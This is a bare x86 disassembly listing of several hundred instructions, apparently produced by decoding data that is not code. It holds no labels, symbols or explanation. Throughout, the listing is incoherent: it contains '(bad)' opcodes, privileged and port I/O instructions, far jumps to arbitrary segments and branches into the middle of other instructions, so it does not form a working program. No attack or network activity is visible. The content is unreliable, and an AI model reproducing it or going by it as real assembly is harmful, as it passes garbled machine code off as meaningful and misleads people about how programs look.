  41369b:	mov    eax,0x6f8e841b
  4136a0:	cmp    al,0x2a
  4136a2:	stc    
  4136a3:	retf   
  4136a4:	adc    BYTE PTR [edi+0x25b9e288],bl
  4136aa:	add    BYTE PTR ds:0xbe6a1b27,0xfa
  4136b1:	inc    esp
  4136b2:	mov    dl,0x72
  4136b4:	fstp   TBYTE PTR [ecx+0x67]
  4136b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136b8:	stc    
  4136b9:	sbb    ebp,eax
  4136bb:	cmp    ecx,DWORD PTR [esi]
  4136bd:	xchg   ebp,eax
  4136be:	xlat   BYTE PTR ds:[ebx]
  4136bf:	(bad)  
  4136c0:	icebp  
  4136c1:	les    edi,FWORD PTR [edi]
  4136c3:	stos   DWORD PTR es:[edi],eax
  4136c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136c5:	jmp    FWORD PTR [esi-0x561b7357]
  4136cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136cc:	mov    esp,0xe8743f55
  4136d1:	outs   dx,DWORD PTR ds:[esi]
  4136d2:	leave  
  4136d3:	xchg   DWORD PTR [edx-0x5f063f3a],ebx
  4136d9:	mov    bl,0x8b
  4136db:	stos   BYTE PTR es:[edi],al
  4136dc:	or     eax,0xfe72e409
  4136e1:	frstor [edx+0x26d17f20]
  4136e7:	inc    ebp
  4136e8:	sub    al,0x34
  4136ea:	ins    BYTE PTR es:[edi],dx
  4136eb:	dec    eax
  4136ec:	mov    dh,0xd1
  4136ee:	leave  
  4136ef:	sbb    edx,esp
  4136f1:	jb     0x413698
  4136f3:	jmp    0x5188:0x73a69a76
  4136fa:	in     al,dx
  4136fb:	adc    ebx,DWORD PTR [ebp+0x59]
  4136fe:	xchg   ecx,eax
  4136ff:	pop    ss
  413700:	sahf   
  413701:	lods   al,BYTE PTR ds:[esi]
  413702:	and    eax,0xe0953608
  413707:	jne    0x4136ce
  413709:	push   esp
  41370a:	and    al,0xcc
  41370c:	es jmp 0x78c10726
  413712:	retf   
  413713:	xor    esp,DWORD PTR [ebp-0x46a144c]
  413719:	fild   WORD PTR [ebp-0x15]
  41371c:	loope  0x4136ee
  41371e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41371f:	int    0x6
  413721:	jp     0x413730
  413723:	out    0x9e,eax
  413725:	and    bl,BYTE PTR [ebx+0x1e]
  413728:	arpl   WORD PTR es:[ecx],bx
  41372b:	xchg   esp,eax
  41372c:	cmp    al,0x57
  41372e:	dec    ebp
  41372f:	test   eax,0xc3425929
  413734:	push   edi
  413735:	(bad)  
  413736:	icebp  
  413737:	icebp  
  413738:	pop    edi
  413739:	push   es
  41373a:	nop
  41373b:	test   BYTE PTR [edi-0x5d17ceea],bh
  413741:	adc    BYTE PTR [edx+eiz*1-0x15],cl
  413745:	int    0x8c
  413747:	sub    DWORD PTR [ecx],esp
  413749:	push   cs
  41374a:	pop    es
  41374b:	xor    ebx,DWORD PTR [ebx+0x51]
  41374e:	jne    0x4136f2
  413750:	mov    ecx,0xf5119836
  413755:	mov    al,0x6d
  413757:	mov    eax,ds:0x28c24b1c
  41375c:	into   
  41375d:	hlt    
  41375e:	rcl    BYTE PTR [esi-0x7b],1
  413761:	inc    eax
  413762:	mov    cl,0x7c
  413764:	inc    esp
  413765:	xchg   esp,eax
  413766:	stc    
  413767:	mov    ch,BYTE PTR [eax-0x73]
  41376a:	and    esi,DWORD PTR [ebx-0x38]
  41376d:	cdq    
  41376e:	jns    0x413785
  413770:	lea    edx,[ecx-0x2d9640ba]
  413776:	fld    st(3)
  413778:	add    bl,bl
  41377a:	rcl    ch,1
  41377c:	and    eax,0xd9327562
  413781:	add    DWORD PTR [ecx+0x47],edx
  413784:	sbb    esi,DWORD PTR [edx-0x49a627df]
  41378a:	popa   
  41378b:	sub    DWORD PTR [eax+0x22b9a8e0],ebp
  413791:	push   0xffffffae
  413793:	jmp    0x69d3ae27
  413798:	je     0x4137b1
  41379a:	or     bh,bh
  41379c:	jae    0x413782
  41379e:	dec    edi
  41379f:	mov    ecx,0x24c3978
  4137a4:	int3   
  4137a5:	and    DWORD PTR es:[eax+0x77e9c3d7],ebp
  4137ac:	cdq    
  4137ad:	pop    ss
  4137ae:	xor    bh,BYTE PTR [ebx]
  4137b0:	cmp    edx,ebx
  4137b2:	jns    0x41378f
  4137b4:	dec    ebp
  4137b5:	push   edi
  4137b6:	xchg   esp,eax
  4137b7:	(bad)  
  4137b8:	pop    esp
  4137b9:	pop    edi
  4137ba:	repz icebp 
  4137bc:	adc    DWORD PTR [esi-0x1b967f81],eax
  4137c2:	inc    ebp
  4137c3:	mov    eax,ds:0x890204a2
  4137c8:	test   BYTE PTR [ebp+0x2a],ah
  4137cb:	les    eax,FWORD PTR [ebx]
  4137cd:	xor    bh,BYTE PTR [edi-0x1e101e7d]
  4137d3:	xchg   BYTE PTR [ebx],dl
  4137d5:	sub    ch,BYTE PTR [ecx+0xa73591a]
  4137db:	dec    ebp
  4137dc:	sub    BYTE PTR [esi],0x60
  4137df:	xchg   esp,eax
  4137e0:	cwde   
  4137e1:	stos   BYTE PTR es:[edi],al
  4137e2:	cmp    eax,0xe7783682
  4137e7:	loope  0x413855
  4137e9:	or     ebp,eax
  4137eb:	lods   al,BYTE PTR gs:[esi]
  4137ed:	jp     0x41382d
  4137ef:	ins    DWORD PTR es:[edi],dx
  4137f0:	in     eax,dx
  4137f1:	es ds mov cl,0xa4
  4137f5:	sahf   
  4137f6:	mov    ecx,0xee700758
  4137fb:	adc    eax,0x3be3bffd
  413800:	push   ss
  413801:	cmp    eax,0x51e666e6
  413806:	sub    cl,BYTE PTR [ecx]
  413808:	push   esi
  413809:	jb     0x41380d
  41380b:	mov    ecx,0x732f6779
  413810:	push   esp
  413811:	ss inc di
  413814:	jb     0x413889
  413816:	sub    DWORD PTR [edx+eax*4+0x22e84ef0],eax
  41381d:	je     0x413852
  41381f:	add    DWORD PTR [esi+0x59cdec7d],esi
  413825:	inc    ebx
  413826:	add    esp,DWORD PTR [eax-0x259ca552]
  41382c:	mov    bh,0x71
  41382e:	push   edi
  41382f:	lods   eax,DWORD PTR fs:[esi]
  413831:	mov    ebx,0xe65913ec
  413836:	sbb    DWORD PTR [eax+0x3bb289c3],ecx
  41383c:	(bad)  
  41383d:	fst    QWORD PTR ds:0x79c1d290
  413843:	test   dh,ch
  413845:	jne    0x4138b8
  413847:	sbb    edx,ecx
  413849:	mov    ds:0xd6fdb674,al
  41384e:	sbb    dh,cl
  413850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413851:	inc    esi
  413852:	in     al,0x6d
  413854:	pop    ebp
  413855:	or     ch,al
  413857:	js     0x413894
  413859:	sahf   
  41385a:	push   eax
  41385b:	leave  
  41385c:	mov    eax,0xd14c94fd
  413861:	pop    es
  413862:	mov    esp,0x1ca38958
  413867:	cs dec ebp
  413869:	push   esi
  41386a:	mov    ebp,0x2f1ab5a7
  41386f:	cwde   
  413870:	(bad)  
  413871:	stos   BYTE PTR es:[edi],al
  413872:	fwait
  413873:	test   cl,bl
  413875:	push   ecx
  413876:	cmp    ebp,DWORD PTR [ebx-0x57]
  413879:	shl    DWORD PTR [edi],cl
  41387b:	mov    ecx,0x1e3c561d
  413880:	adc    eax,0xb1e8d69b
  413885:	inc    BYTE PTR [ebx]
  413887:	test   al,0xf6
  413889:	xor    BYTE PTR [eax-0x21386e7],bh
  41388f:	outs   dx,DWORD PTR ds:[esi]
  413890:	dec    edx
  413891:	lahf   
  413892:	jp     0x4138a3
  413894:	enter  0x3ffa,0xa2
  413898:	stos   BYTE PTR es:[edi],al
  413899:	xchg   ebx,eax
  41389a:	pop    edx
  41389b:	sbb    dl,BYTE PTR [edx-0x1f5159c9]
  4138a1:	cmp    DWORD PTR ds:0x915d1ed1,0xffffffcf
  4138a8:	fucom  st(5)
  4138aa:	jecxz  0x4138df
  4138ac:	and    al,BYTE PTR ds:0xf8b29ebc
  4138b2:	test   eax,0xc23b618b
  4138b7:	push   ecx
  4138b8:	test   al,0x41
  4138ba:	add    al,BYTE PTR [edx-0x2a]
  4138bd:	cs je  0x4138eb
  4138c0:	jnp    0x413940
  4138c2:	fsubr  DWORD PTR [ebx+0x66]
  4138c5:	inc    ebp
  4138c6:	pop    es
  4138c7:	push   ebx
  4138c8:	call   0xeee4:0xf5d5fef6
  4138cf:	jmp    0x9528e1d6
  4138d4:	daa    
  4138d5:	adc    eax,0xeb8c7ac3
  4138da:	div    ch
  4138dc:	(bad)  [edx-0x414c5531]
  4138e2:	adc    DWORD PTR [edi-0x649e8e2b],ebx
  4138e8:	cmp    BYTE PTR [edi+ebp*8-0x16],dh
  4138ec:	scas   eax,DWORD PTR es:[edi]
  4138ed:	sti    
  4138ee:	push   ecx
  4138ef:	xor    ecx,ebx
  4138f1:	dec    ebp
  4138f2:	jo     0x413949
  4138f4:	fisubr WORD PTR [eax-0x3725735f]
  4138fa:	fld    TBYTE PTR [ebx-0x27769251]
  413900:	sar    edi,0x25
  413903:	lods   al,BYTE PTR ds:[esi]
  413904:	xor    edi,DWORD PTR [eax+ebp*4+0x14126052]
  41390b:	mov    fs,WORD PTR [edi+ebx*2]
  41390e:	sahf   
  41390f:	mov    ds:0xd855d6b6,al
  413914:	push   ebx
  413915:	adc    ebx,DWORD PTR ds:0x3fdb5d78
  41391b:	and    bl,cl
  41391d:	cmc    
  41391e:	div    eax
  413920:	mov    cl,0x55
  413922:	mov    ch,0xe4
  413924:	jns    0x4138a6
  413926:	dec    esp
  413927:	mov    esp,0xccde4686
  41392c:	push   ebp
  41392d:	jns    0x41398f
  41392f:	fist   WORD PTR [ecx+eax*1]
  413932:	pop    ecx
  413933:	mov    DWORD PTR [edi+edx*8],esp
  413936:	or     ch,BYTE PTR [ebp+0x17a1dc8e]
  41393c:	lock sbb al,BYTE PTR [edx+0x48]
  413940:	les    esi,FWORD PTR [edi]
  413942:	cli    
  413943:	mov    dl,dl
  413945:	scas   al,BYTE PTR es:[edi]
  413946:	outs   dx,BYTE PTR ds:[esi]
  413947:	int    0xdc
  413949:	fwait
  41394a:	ror    esi,1
  41394c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41394d:	aaa    
  41394e:	and    al,0xec
  413950:	inc    edx
  413951:	es mov esp,0x181083f8
  413957:	sub    BYTE PTR [esi-0x41],ah
  41395a:	add    al,0x75
  41395c:	pop    esi
  41395d:	loop   0x413985
  41395f:	popa   
  413960:	sbb    DWORD PTR [esi-0xb6a73c3],esp
  413966:	push   0x1cbacc92
  41396b:	jne    0x4139bc
  41396d:	cmp    edi,DWORD PTR [eax+edx*4]
  413970:	xchg   BYTE PTR [eax+0x68],ah
  413973:	popf   
  413974:	sbb    edx,DWORD PTR [ebx+edi*8+0x43]
  413978:	jne    0x41392c
  41397a:	xchg   al,bh
  41397c:	or     BYTE PTR [ebx+0x34],bh
  41397f:	pushf  
  413980:	loop   0x413902
  413982:	in     eax,dx
  413983:	lock or eax,0x4264c960
  413989:	das    
  41398a:	rol    BYTE PTR [esi-0x3226f1b4],0x9f
  413991:	mov    cl,BYTE PTR [ebx]
  413993:	or     esi,DWORD PTR ss:[ebx+0x16]
  413997:	clc    
  413998:	and    BYTE PTR [edx+esi*2+0x77b5e444],bl
  41399f:	xor    bh,BYTE PTR [ebx-0x53]
  4139a2:	addr16 (bad) 
  4139a4:	adc    dh,al
  4139a6:	(bad)  
  4139a7:	mov    WORD PTR [eax],fs
  4139a9:	cmp    dh,0xb0
  4139ac:	dec    esp
  4139ad:	jnp    0x413a11
  4139af:	retf   0x7f4f
  4139b2:	popa   
  4139b3:	div    edi
  4139b5:	inc    ebp
  4139b6:	lods   al,BYTE PTR ds:[esi]
  4139b7:	xchg   BYTE PTR [eax],ah
  4139b9:	repnz inc esp
  4139bb:	rcl    DWORD PTR [ebx-0x276069e3],1
  4139c1:	push   ebx
  4139c2:	adc    esi,esp
  4139c4:	push   ds
  4139c5:	fsub   QWORD PTR ds:0x8a2e9831
  4139cb:	in     al,0x99
  4139cd:	aam    0xf9
  4139cf:	inc    edi
  4139d0:	pop    ecx
  4139d1:	outs   dx,DWORD PTR ds:[esi]
  4139d2:	sub    al,0x59
  4139d4:	push   ds
  4139d5:	ss mov ebx,0xf27213ef
  4139db:	fisubr WORD PTR fs:[edx+eiz*8-0x78]
  4139e0:	mov    esp,0xcae814b6
  4139e5:	or     ecx,DWORD PTR [ebx]
  4139e7:	sub    DWORD PTR [ecx-0x47bc47e3],0x7b052bde
  4139f1:	loope  0x413a0e
  4139f3:	inc    ebx
  4139f4:	and    ebp,DWORD PTR ds:[ebx+0x74057f6]
  4139fb:	data16 or BYTE PTR [ebp-0x3e5f50ff],0x45
  413a03:	(bad)  
  413a04:	minps  xmm5,XMMWORD PTR [ecx+ecx*1+0x28a75ecb]
  413a0c:	retf   0x1fc4
  413a0f:	iret   
  413a10:	mov    bl,0xc0
  413a12:	lds    eax,FWORD PTR [esp+edi*8+0x5e0ec192]
  413a19:	cdq    
  413a1a:	sti    
  413a1b:	adc    edx,DWORD PTR [ebp+0x18299e77]
  413a21:	out    dx,al
  413a22:	or     ah,BYTE PTR [edx+0x4a]
  413a25:	mov    ds:0xb481c0f4,eax
  413a2a:	mov    DWORD PTR [eax+eax*1],esp
  413a2d:	es scas al,BYTE PTR es:[edi]
  413a2f:	mov    cl,dl
  413a31:	mov    bh,0xeb
  413a33:	jno    0x413a43
  413a35:	mov    di,0x7022
  413a39:	add    bl,BYTE PTR [edx]
  413a3b:	sahf   
  413a3c:	push   ebp
  413a3d:	or     DWORD PTR [ebp+0x3f],edx
  413a40:	pusha  
  413a41:	out    dx,eax
  413a42:	push   ds
  413a43:	repnz rcl BYTE PTR [ebx+0x27],cl
  413a47:	mov    ah,0xdb
  413a49:	jmp    0xa5e6:0x6541e703
  413a50:	ins    DWORD PTR es:[edi],dx
  413a51:	pop    eax
  413a52:	adc    bl,BYTE PTR [edi-0x2977d576]
  413a58:	or     BYTE PTR [ecx+0x7d9734bd],dl
  413a5e:	push   ds
  413a5f:	mov    eax,0x7afd1288
  413a64:	cld    
  413a65:	jne    0x9dfc4c15
  413a6b:	or     DWORD PTR [ebx],eax
  413a6d:	sbb    ebx,edx
  413a6f:	ffreep st(6)
  413a71:	inc    ebp
  413a72:	mov    edi,0x6a46b9ac
  413a77:	jo     0x413aa8
  413a79:	sub    ebx,DWORD PTR [ebx-0x7bbb7e48]
  413a7f:	out    dx,al
  413a80:	inc    ecx
  413a81:	les    ebx,FWORD PTR ds:0xd5be2364
  413a87:	pop    esi
  413a88:	scas   al,BYTE PTR es:[edi]
  413a89:	loope  0x413ae5
  413a8b:	inc    eax
  413a8c:	mov    cl,0xae
  413a8e:	push   ds
  413a8f:	xchg   ebx,eax
  413a90:	imul   ebx,DWORD PTR [eax+0x15],0x86b52c85
  413a97:	(bad)  
  413a98:	mov    dh,0xbb
  413a9a:	pop    eax
  413a9b:	loop   0x413a20
  413a9d:	ds pop ss
  413a9f:	dec    esp
  413aa0:	jmp    0x9d0fbd69
  413aa5:	retf   
  413aa6:	fldenv [eax]
  413aa8:	push   edi
  413aa9:	inc    ebp
  413aaa:	sbb    eax,0x41bb4050
  413aaf:	xor    ecx,DWORD PTR ds:0x86cf511f
  413ab5:	shr    BYTE PTR [bp+di-0x8],0xf1
  413aba:	ret    
  413abb:	jne    0x413a52
  413abd:	fidiv  WORD PTR [ebx+0x58]
  413ac0:	sub    al,0x78
  413ac2:	mov    al,0x66
  413ac4:	repz scas al,BYTE PTR es:[edi]
  413ac6:	repz pop edx
  413ac8:	ror    BYTE PTR [ebx+0x7298a788],0x9c
  413acf:	or     eax,0x2639ebd2
  413ad4:	mov    al,ds:0x8f1b7659
  413ad9:	in     al,dx
  413ada:	(bad)  
  413adb:	sti    
  413adc:	push   edx
  413add:	(bad)  
  413ade:	mov    bl,0x22
  413ae0:	xor    cl,dh
  413ae2:	ss dec eax
  413ae4:	adc    BYTE PTR [ecx],dh
  413ae6:	add    al,0x5b
  413ae8:	add    DWORD PTR ds:0xa53496a1,ecx
  413aee:	mov    eax,0x9a20974d
  413af3:	cmp    edx,ebp
  413af5:	inc    ecx
  413af6:	pop    edi
  413af7:	jecxz  0x413b3e
  413af9:	jnp    0x413ada
  413afb:	sbb    DWORD PTR [ebx],edi
  413afd:	pushf  
  413afe:	add    ebp,DWORD PTR [edi-0xf161801]
  413b04:	js     0x413b16
  413b06:	mov    BYTE PTR [ebx-0x2363ba58],bl
  413b0c:	push   ebp
  413b0d:	or     al,0x92
  413b0f:	lahf   
  413b10:	mov    ch,0xb7
  413b12:	leave  
  413b13:	pusha  
  413b14:	push   eax
  413b15:	jmp    0x413af2
  413b17:	inc    ecx
  413b18:	xchg   BYTE PTR [edx-0x6b],al
  413b1b:	xor    eax,0xec71b9e8
  413b20:	jnp    0x413b41
  413b22:	inc    esi
  413b23:	push   esi
  413b24:	mov    ds:0xcd32ac67,eax
  413b29:	mov    edx,0xcbe9cfcf
  413b2e:	mov    bl,BYTE PTR [edi]
  413b30:	std    
  413b31:	xor    DWORD PTR [ebx-0x36f8d590],0x60
  413b38:	imul   ebx,edx,0x82ff2e28
  413b3e:	sbb    BYTE PTR [esi-0x26],ch
  413b41:	shl    DWORD PTR [edx],1
  413b43:	and    dh,BYTE PTR [eax+0x38]
  413b46:	fdivr  QWORD PTR [ebx-0xb]
  413b49:	lea    ecx,[ebp-0x22139e5a]
  413b4f:	xor    dl,ch
  413b51:	xor    al,bl
  413b53:	hlt    
  413b54:	mov    cl,0x8d
  413b56:	mov    al,0xa9
  413b58:	jbe    0x413b62
  413b5a:	sub    al,0x4a
  413b5c:	lods   al,BYTE PTR ds:[esi]
  413b5d:	fdiv   st,st(0)
  413b5f:	je     0x413b48
  413b61:	imul   esi,esp,0xffffffcf
  413b64:	in     al,0xcc
  413b66:	sbb    cl,al
  413b68:	inc    ebp
  413b69:	out    0x1c,eax
  413b6b:	xchg   edi,eax
  413b6c:	loopne 0x413af6
  413b6e:	out    0xab,eax
  413b70:	push   ecx
  413b71:	dec    esi
  413b72:	sub    al,0x60
  413b74:	fnsave [eax+0x5bd8bc93]
  413b7a:	out    0x82,al
  413b7c:	mov    BYTE PTR [ebx-0x1c],dl
  413b7f:	sar    DWORD PTR [edx+0x26],0x2
  413b83:	jo     0x413b25
  413b85:	lea    esp,[esi]
  413b87:	adc    eax,0x15d72a3
  413b8c:	adc    dl,ch
  413b8e:	xlat   BYTE PTR ds:[ebx]
  413b8f:	push   ebp
  413b90:	in     al,0x7f
  413b92:	rcl    DWORD PTR [esi-0x75],1
  413b95:	data16 mov dl,0xa3
  413b98:	mov    al,ds:0xea20822c
  413b9d:	mov    edi,0x881965a2
  413ba2:	mov    edx,ebp
  413ba4:	jmp    0x2bf1a159
  413ba9:	xchg   edx,eax
  413baa:	fwait
  413bab:	push   eax
  413bac:	adc    ch,BYTE PTR [edi]
  413bae:	sbb    al,0x28
  413bb0:	mov    al,0xc7
  413bb2:	adc    edi,DWORD PTR [edx-0x6fca4e8e]
  413bb8:	inc    ebp
  413bb9:	bound  ecx,QWORD PTR [edi-0x27547398]
  413bbf:	sahf   
  413bc0:	mov    cl,0x37
  413bc2:	ins    BYTE PTR es:[edi],dx
  413bc3:	fisubr DWORD PTR [ebp+0x34e614e8]
  413bc9:	xor    al,0x60
  413bcb:	out    dx,eax
  413bcc:	pop    edi
  413bcd:	stc    
  413bce:	cmp    eax,0x3d3f7fa4
  413bd3:	inc    ebx
  413bd4:	pop    ecx
  413bd5:	inc    edx
  413bd6:	nop
  413bd7:	cmp    DWORD PTR [edi+0x196481e6],esp
  413bdd:	cmp    al,0x89
  413bdf:	cmp    DWORD PTR [edi],edx
  413be1:	mov    dh,0x9f
  413be3:	call   esp
  413be5:	mov    ebp,ss
  413be7:	mov    esi,0x6cf3ee89
  413bec:	mov    bl,0x3f
  413bee:	push   edi
  413bef:	pop    esp
  413bf0:	call   0xeb1f08ba
  413bf5:	add    eax,0x68da9861
  413bfa:	mov    dh,0x9
  413bfc:	cmp    edx,DWORD PTR [edi]
  413bfe:	retf   0xe32e
  413c01:	xchg   edx,eax
  413c02:	ror    DWORD PTR [ebx-0x6b],cl
  413c05:	gs stos BYTE PTR es:[edi],al
  413c07:	pop    ebp
  413c08:	jp     0x413ba9
  413c0a:	cmp    eax,0x42a23f1d
  413c0f:	push   edx
  413c10:	push   ebp
  413c11:	sbb    al,0xa9
  413c13:	or     DWORD PTR [edi+0x62],ecx
  413c16:	(bad)  
  413c17:	jecxz  0x413c40
  413c19:	cmp    eax,esi
  413c1b:	add    eax,0xf4811c02
  413c20:	loope  0x413bca
  413c22:	and    BYTE PTR ds:0x42484b86,0xe3
  413c29:	test   al,0x56
  413c2b:	mov    edi,0xb90b5824
  413c30:	shl    BYTE PTR [ebx+0x3e1c48c2],cl
  413c36:	mov    esp,0xb30e94da
  413c3b:	sahf   
  413c3c:	js     0x413c03
  413c3e:	sbb    BYTE PTR [esi-0x3b],dl
  413c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c42:	xchg   esi,eax
  413c43:	mov    bh,0xdd
  413c45:	scas   eax,DWORD PTR es:[edi]
  413c46:	xor    ebp,DWORD PTR [eax+0x4c]
  413c49:	xor    eax,0xf9ed052
  413c4e:	cmp    ch,ah
  413c50:	call   0xc8d7:0xf94997ba
  413c57:	inc    eax
  413c58:	(bad)  
  413c59:	adc    bl,ch
  413c5b:	pop    ebx
  413c5d:	fwait
  413c5e:	lahf   
  413c5f:	cmp    eax,0x8271edc2
  413c64:	hlt    
  413c65:	int3   
  413c66:	jmp    0x68429f84
  413c6b:	cld    
  413c6c:	jo     0x413c1c
  413c6e:	mov    ecx,0xa00edbe7
  413c73:	fnsetpm(287 only) 
  413c75:	or     BYTE PTR [ebx-0x35eee42f],ah
  413c7b:	sbb    al,0x2
  413c7d:	and    DWORD PTR [edx+0x53d50dcd],ecx
  413c83:	inc    edx
  413c84:	xor    bl,bl
  413c86:	outs   dx,DWORD PTR ds:[esi]
  413c87:	lahf   
  413c88:	adc    DWORD PTR [ebp+0x74a596f],esi
  413c8e:	aad    0xc1
  413c90:	add    ebp,DWORD PTR [ecx-0x420499fa]
  413c96:	(bad)  
  413c97:	je     0x413c81
  413c99:	or     al,0xca
  413c9b:	fiadd  DWORD PTR [edx-0x6]
  413c9e:	push   eax
  413c9f:	jb     0x413c99
  413ca1:	xchg   esp,eax
  413ca2:	pop    ss
  413ca3:	mov    ds:0x2602ff67,al
  413ca8:	aam    0xea
  413caa:	and    al,BYTE PTR [ebx+0x610f81c2]
  413cb0:	xchg   esi,eax
  413cb1:	in     al,0x8d
  413cb3:	jns    0x413cf9
  413cb5:	icebp  
  413cb6:	sbb    eax,0x2375c039
  413cbb:	push   ebp
  413cbc:	fcomi  st,st(6)
  413cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cbf:	inc    esp
  413cc0:	inc    esp
  413cc1:	jae    0x413c54
  413cc3:	lods   al,BYTE PTR ds:[esi]
  413cc4:	cmp    edx,DWORD PTR [edi+ebp*4]
  413cc7:	dec    ebx
  413cc8:	mov    esi,0xafa6aaf6
  413ccd:	aas    
  413cce:	pop    edx
  413ccf:	and    DWORD PTR [edi],ebx
  413cd1:	mov    eax,0x488a05da
  413cd6:	fsub   QWORD PTR [ebp+0x20fdf583]
  413cdc:	cs jne 0x413d07
  413cdf:	add    ch,BYTE PTR [esi+0x70e81da3]
  413ce5:	js     0x413cb8
  413ce7:	pop    ss
  413ce8:	inc    bl
  413cea:	sub    DWORD PTR [esi+0x28],edi
  413ced:	ror    BYTE PTR [edi],cl
  413cef:	mov    ss:0x9394c291,al
  413cf5:	ss retf 0xfcf
  413cf9:	out    dx,al
  413cfa:	outs   dx,BYTE PTR ds:[esi]
  413cfb:	dec    esp
  413cfc:	mov    ch,0xd8
  413cfe:	mov    bl,0x69
  413d00:	mov    al,ds:0x9f43813d
  413d05:	test   esp,edx
  413d07:	popf   
  413d08:	cld    
  413d09:	iret   
  413d0a:	and    BYTE PTR [ebx+esi*4+0x2c423083],dl
  413d11:	(bad)  
  413d12:	into   
  413d13:	iret   
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	dec    esp
  413d16:	retf   0x48a1
  413d19:	mov    dl,dl
  413d1b:	mov    WORD PTR [ebx-0x39],?
  413d1e:	popa   
  413d1f:	cmp    BYTE PTR [eax-0x24],al
  413d22:	add    bl,BYTE PTR [ebx]
  413d24:	and    bl,BYTE PTR [esi-0x3c07ba]
  413d2a:	frstor [esi-0x6842051]
  413d30:	sub    al,0x44
  413d32:	sub    DWORD PTR [ebx+0x3f],eax
  413d35:	stos   BYTE PTR es:[edi],al
  413d36:	sub    eax,0x8b6a96cb
  413d3b:	rcl    BYTE PTR [esi-0x74],0x55
  413d3f:	jb     0x413ced
  413d41:	mov    cs,WORD PTR [ebx-0x5380444b]
  413d47:	xor    edx,DWORD PTR [eax+0x34]
  413d4a:	sub    BYTE PTR [edi+eiz*4-0x65],ah
  413d4e:	aam    0xca
  413d50:	sub    eax,0x85871018
  413d55:	add    BYTE PTR [ebx],bh
  413d57:	imul   ecx,ecx,0xde5ba9af
  413d5d:	mov    WORD PTR [ebp+edx*1-0x871997c],ss
  413d64:	mov    eax,DWORD PTR [esi+edx*2-0x45ba34cb]
  413d6b:	mov    ecx,0x1a231b42
  413d70:	jb     0x413dd1
  413d72:	sbb    DWORD PTR [ebx],ecx
  413d74:	inc    esi
  413d75:	(bad)  
  413d76:	jb     0x413d77
  413d78:	or     BYTE PTR [ecx],0xb3
  413d7b:	in     eax,dx
  413d7c:	test   eax,0x2159ff7d
  413d81:	and    eax,0x803846b2
  413d86:	popa   
  413d87:	les    eax,FWORD PTR [ecx]
  413d89:	lock (bad) [eax-0x595b9832]
  413d90:	pop    edi
  413d91:	push   edi
  413d92:	pop    edx
  413d93:	les    edi,FWORD PTR [edx]
  413d95:	and    DWORD PTR [ecx],0x28
  413d98:	push   ss
  413d99:	jg     0x413d90
  413d9b:	das    
  413d9c:	pop    es
  413d9d:	mov    dl,0x9f
  413d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413da0:	call   0x248:0x922b7a41
  413da7:	mov    ecx,0xade749dc
  413dac:	inc    ebp
  413dad:	sub    bl,BYTE PTR [ebx-0x626a5f77]
  413db3:	mov    al,0x79
  413db5:	fwait
  413db6:	sbb    eax,0x6f607fe6
  413dbb:	xor    BYTE PTR [edx-0xcd29b2b],dl
  413dc1:	aaa    
  413dc2:	mov    edi,0xa93e917
  413dc7:	inc    ebp
  413dc9:	aad    0x16
  413dcb:	fcmovne st,st(5)
  413dcd:	pop    ebp
  413dce:	retf   0xe800
  413dd1:	pushf  
  413dd2:	or     al,0x1f
  413dd4:	inc    ebx
  413dd5:	lods   al,BYTE PTR ds:[esi]
  413dd6:	mov    ds:0xbd18ebc8,eax
  413ddb:	divps  xmm7,XMMWORD PTR [edi+0x4d163597]
  413de2:	pop    ebx
  413de3:	xor    DWORD PTR [ecx],ebx
  413de5:	inc    ebx
  413de6:	sbb    eax,DWORD PTR [edi+0x44]
  413de9:	ds es dec ecx
  413dec:	fwait
  413ded:	out    0x93,eax
  413def:	data16 fdivr QWORD PTR [ecx]
  413df2:	aad    0xf5
  413df4:	sbb    BYTE PTR [edx],bh
  413df6:	xor    BYTE PTR [eax+0x7ca1f8d3],dh
  413dfc:	cs in  al,dx
  413dfe:	xor    eax,0xb3690f4b
  413e03:	push   eax
  413e04:	popf   
  413e05:	lahf   
  413e06:	and    ebp,esi
  413e08:	lods   eax,DWORD PTR ds:[esi]
  413e09:	mov    dh,0xe7
  413e0b:	in     eax,0x19
  413e0d:	or     al,0x25
  413e0f:	mov    eax,0xa52a696d
  413e14:	pop    edi
  413e15:	inc    edi
  413e16:	fsubr  QWORD PTR [ecx-0x73]
  413e19:	and    eax,0x98d2f6cb
  413e1e:	lock jbe 0x413e59
  413e21:	jg     0x413e9b
  413e23:	or     ah,BYTE PTR [edx]
  413e25:	mov    bh,BYTE PTR [edx]
  413e27:	test   eax,0x9ee357d7
  413e2c:	or     DWORD PTR [edx],edi
  413e2e:	sub    DWORD PTR [eax-0x6c],eax
  413e31:	inc    edi
  413e32:	in     al,dx
  413e33:	jns    0x413e33
  413e35:	add    ch,BYTE PTR [ecx]
  413e37:	push   edi
  413e38:	rcl    DWORD PTR [edi-0x68055744],cl
  413e3e:	jle    0x413e76
  413e40:	mov    ebp,0xf07e84b9
  413e45:	sti    
  413e46:	loop   0x413e66
  413e48:	pop    esp
  413e49:	test   al,0x4b
  413e4b:	mov    ecx,0xb45b12f9
  413e50:	cwde   
  413e51:	push   edx
  413e52:	mov    eax,ds:0xa8ac6391
  413e57:	nop
  413e58:	mov    edx,0x251344b5
  413e5d:	sub    eax,0x1d835997
  413e62:	push   esp
  413e63:	sar    BYTE PTR [ecx+0x599b0fbe],cl
  413e69:	adc    dh,bl
  413e6b:	dec    esp
  413e6c:	ins    DWORD PTR es:[edi],dx
  413e6d:	and    al,0xcb
  413e6f:	das    
  413e70:	mov    edx,0xabf53e43
  413e75:	pop    ds
  413e76:	xchg   esp,eax
  413e77:	sbb    al,0x90
  413e79:	lods   al,BYTE PTR ds:[esi]
  413e7a:	dec    ecx
  413e7b:	fist   DWORD PTR [esi+0x3d]
  413e7e:	lds    ebx,FWORD PTR [ebp-0x67]
  413e81:	fbstp  TBYTE PTR [edx+0x62]
  413e84:	vsubps xmm2,xmm7,XMMWORD PTR [ecx]
  413e88:	cmp    eax,0x1e31d917
  413e8d:	push   ds
  413e8e:	push   ebp
  413e8f:	pop    ebx
